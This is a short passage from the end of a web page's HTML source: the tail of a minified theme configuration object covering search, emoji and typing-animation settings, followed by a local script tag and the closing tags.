found",snippetLength:30,type:"lunr"},twemoji:!0,typeit:{cursorChar:"|",cursorSpeed:1500,data:{"id-1":["id-1"],"id-2":["id-2"]},duration:5e3,speed:150}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>